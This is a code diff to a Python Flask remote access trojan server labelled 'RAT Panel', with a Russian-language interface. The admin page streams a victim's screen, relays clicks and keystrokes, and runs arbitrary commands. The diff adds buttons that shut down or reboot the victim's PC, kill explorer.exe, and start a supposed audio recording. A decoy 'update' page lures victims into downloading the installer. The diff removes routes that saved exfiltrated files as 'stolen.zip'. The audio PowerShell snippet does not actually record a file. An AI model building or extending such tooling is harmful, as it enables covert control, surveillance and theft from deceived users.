@@ -11,18 +11,23 @@ HTML_ADMIN = """
 <!DOCTYPE html>
 <html>
 <head><title>RAT Panel</title></head>
-<body style="background:#111; color:white; text-align:center; font-family:Arial;">
+<body style="background:#111; color:white; text-align:center; font-family:Arial; margin:0; padding:20px;">
     <h1>Панель управления</h1>
-    <div style="position:relative; display:inline-block;">
-        <img id="screen" src="/get_screen" style="width:80%; border:2px solid red; cursor:crosshair;" onclick="sendClick(event)">
+    <div style="display:flex; justify-content:center; gap:20px; margin-bottom:20px;">
+        <div style="width:70%;">
+            <img id="screen" src="/get_screen" style="width:100%; border:2px solid red; cursor:crosshair;" onclick="sendClick(event)">
+        </div>
+        <div style="width:25%; background:#222; padding:10px; border-radius:5px;">
+            <h3>Управление</h3>
+            <button onclick="sendCmd('shutdown /s /t 0')" style="width:100%; padding:10px; margin-bottom:5px; background:red; color:white; border:none;">Выключить ПК</button>
+            <button onclick="sendCmd('shutdown /r /t 0')" style="width:100%; padding:10px; margin-bottom:5px; background:orange; color:white; border:none;">Перезагрузить</button>
+            <button onclick="recordAudio()" style="width:100%; padding:10px; margin-bottom:5px; background:purple; color:white; border:none;">Записать звук</button>
+            <button onclick="sendCmd('taskkill /f /im explorer.exe')" style="width:100%; padding:10px; background:gray; color:white; border:none;">Скрыть всё</button>
+        </div>
     </div>
-    <br><br>
-    <input type="text" id="cmd" placeholder="Команда или текст..." style="padding:10px; width:300px;">
-    <button onclick="sendKey()" style="padding:10px;">Отправить текст</button>
-    <button onclick="sendCmd()" style="padding:10px; background:orange;">Выполнить в CMD</button>
     
-    <br><br>
-    <a href="/get_file" style="color:yellow;">📁 Забрать файл (из C:\Temp\out.zip)</a>
+    <input type="text" id="cmd" placeholder="Команда..." style="padding:10px; width:300px;">
+    <button onclick="sendKey()" style="padding:10px;">Отправить</button>
     
     <script>
         function refreshImg() {
@@ -44,9 +49,13 @@ HTML_ADMIN = """
             document.getElementById('cmd').value = '';
         }
         
-        function sendCmd() {
-            var text = document.getElementById('cmd').value;
-            fetch('/run_cmd', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({cmd: text}) });
+        function sendCmd(cmd) {
+            fetch('/run_cmd', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({cmd: cmd}) });
+        }
+        
+        function recordAudio() {
+            sendCmd('powershell -c "Add-Type -AssemblyName System.Speech; $rec = New-Object System.Speech.Recognition.SpeechRecognitionEngine; $rec.SetInputToDefaultAudioDevice(); $rec.RecognizeAsync(); Start-Sleep -s 5; $rec.RecognizeAsyncStop();"');
+            alert('Запись начата на 5 секунд. Через 10 секунд забери файл audio.wav!');
         }
     </script>
 </body>
@@ -56,7 +65,7 @@ HTML_ADMIN = """
 HTML_VICTIM = """
 <!DOCTYPE html>
 <html>
-<head><title>Обновление драйверов</title></head>
+<head><title>Обновление</title></head>
 <body style="background:#1e1e1e; color:white; text-align:center; padding-top:50px; font-family:Arial;">
     <h1>Скачайте установщик</h1>
     <a href="/download" style="padding:15px 30px; font-size:20px; background:#007bff; color:white; text-decoration:none; border-radius:5px;">Скачать</a>
@@ -106,22 +115,6 @@ def run_cmd():
     data = request.json
     commands.append(f"CMD|{data['cmd']}")
     return "OK"
-
-# Новый маршрут: скачивание файла с клиента
-@app.route('/upload_file', methods=['POST'])
-def upload_file_from_client():
-    global file_to_download
-    file = request.files['file']
-    file_to_download = 'stolen.zip'
-    file.save(file_to_download)
-    return "OK"
-
-@app.route('/get_file')
-def get_file():
-    global file_to_download
-    if file_to_download and os.path.exists(file_to_download):
-        return send_file(file_to_download, as_attachment=True, download_name='stolen.zip')
-    return "Файла нет"
 
 @app.route('/download')
 def download():
